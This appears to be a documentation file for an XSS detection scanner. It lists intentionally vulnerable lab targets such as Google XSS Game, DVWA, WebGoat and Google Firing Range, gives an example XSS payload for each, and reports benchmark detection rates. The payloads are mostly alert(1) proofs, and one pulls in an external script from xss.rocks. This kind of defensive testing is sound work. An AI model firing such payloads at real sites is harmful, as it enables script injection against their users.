Project: BRS-XSS (XSS Detection Suite)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: Thu 08 Jan 2026 17:25:59 UTC
Status: Created
Telegram: https://t.me/EasyProTech
 
# Known Validation Targets

| Platform | Level / Endpoint | Method | Example Request | Expected Result |
|----------|------------------|--------|-----------------|-----------------|
| Google XSS Game | Level 1 – `/level1/frame?query=PAYLOAD` | GET | `https://xss-game.appspot.com/level1/frame?query=<script>alert(1)</script>` | Reflected XSS in HTML (low) |
| Google XSS Game | Level 2 – `/level2/frame` | POST | `message=<img src=x onerror=alert(1)>` | Stored XSS in chat (low) |
| Google XSS Game | Level 3 – `/level3/frame#FRAGMENT` | GET | `#1' onerror='alert(1)'` | DOM XSS via fragment (medium) |
| Google XSS Game | Level 4 – `/level4/frame?timer=PAYLOAD` | GET | `timer=1');alert('1` | XSS in JS context (medium) |
| Google XSS Game | Level 5 – `/level5/frame/signup?next=PAYLOAD` | GET | `next=javascript:alert(1)` | Bypass via `javascript:` (medium) |
| Google XSS Game | Level 6 – `/level6/frame#PAYLOAD` | GET | `#//xss.rocks/xss.js` | External script (high) |
| DVWA | `/vulnerabilities/xss_r/` (low/med/high) | GET | `name=<script>alert(1)</script>` and variations | Reflected XSS (HTML) |
| DVWA | `/vulnerabilities/xss_s/` (low/med) | POST | `txtName=<script>alert(1)</script>` | Stored XSS (Guestbook) |
| DVWA | `/vulnerabilities/xss_d/` (low/med) | GET | `default=<svg/onload=alert(1)>` | DOM XSS (HTML/JS) |
| WebGoat | `/CrossSiteScripting/attack5a` | POST | `field1=<script>alert(1)</script>` | Reflected XSS |
| WebGoat | `/CrossSiteScripting/attack6a` | GET | `route=test<script>alert(1)</script>` | DOM XSS (medium) |
| WebGoat | `/CrossSiteScripting/attack7` | POST | `comment=<script>alert(1)</script>` | Stored XSS |
| WebGoat | `/CrossSiteScripting/attack8` | GET | `input=<script>alert(1)</script>` | CSP/JS XSS (high) |
| Benchmarks | `performance-test.py` list | mix | see file | Used for automated speed/quality comparison |
| IBM Altoro | `/search.jsp?query=PAYLOAD` | GET | `https://demo.testfire.net/search.jsp?query=<script>alert(1)</script>` | Reflected + DOM XSS |
| alf.nu | `/alert1` | GET | `https://alf.nu/alert1` | DOM XSS challenges |
| testphp.vulnweb.com | `/search.php?searchFor=PAYLOAD` | GET | `http://testphp.vulnweb.com/search.php?searchFor=<script>alert(1)</script>` | Reflected XSS |
| Google Firing Range | `/reflected/parameter/body?q=PAYLOAD` | GET | `https://public-firing-range.appspot.com/reflected/parameter/body?q=<script>alert(1)</script>` | Reflected XSS |
| Google Firing Range | `/reflected/parameter/attribute_unquoted?q=PAYLOAD` | GET | `https://public-firing-range.appspot.com/reflected/parameter/attribute_unquoted?q=test` | Attribute XSS |
| Google Firing Range | `/reflected/parameter/attribute_quoted?q=PAYLOAD` | GET | `https://public-firing-range.appspot.com/reflected/parameter/attribute_quoted?q=test` | Attribute XSS |
| Google Firing Range | `/reflected/parameter/tagname?q=PAYLOAD` | GET | `https://public-firing-range.appspot.com/reflected/parameter/tagname?q=test` | Tag Name XSS |
| Google Firing Range | `/reflected/parameter/js_string_singlequote?q=PAYLOAD` | GET | `https://public-firing-range.appspot.com/reflected/parameter/js_string_singlequote?q=test` | JS String XSS |
| Google Firing Range | `/reflected/parameter/js_string_doublequote?q=PAYLOAD` | GET | `https://public-firing-range.appspot.com/reflected/parameter/js_string_doublequote?q=test` | JS String XSS |
| Google Firing Range | `/reflected/url/href?q=PAYLOAD` | GET | `https://public-firing-range.appspot.com/reflected/url/href?q=javascript:alert(1)` | URL XSS |
| OWASP Juice Shop | `/#/search?q=PAYLOAD` | GET | `https://juice-shop.herokuapp.com/#/search?q=<script>alert(1)</script>` | DOM XSS (SPA) |

## Benchmark Results (2026-01-10)

| Target | Tests | Passed | Detection Rate |
|--------|-------|--------|----------------|
| Google XSS Game | 6 | 6 | 100% |
| Google Firing Range | 7 | 7 | 100% |
| IBM Altoro Mutual | 1 | 1 | 100% |
| alf.nu/alert1 | 1 | 1 | 100% |
| **Total** | **15** | **15** | **100%** |

### Notes
- Juice Shop and testhtml5.vulnweb.com timeout due to SPA/HTTP issues (not detection failures)
- All completed scans successfully detected XSS vulnerabilities

> Note: All targets assume authorized testing. Before scanning, ensure you have permission and safe mode settings configured.
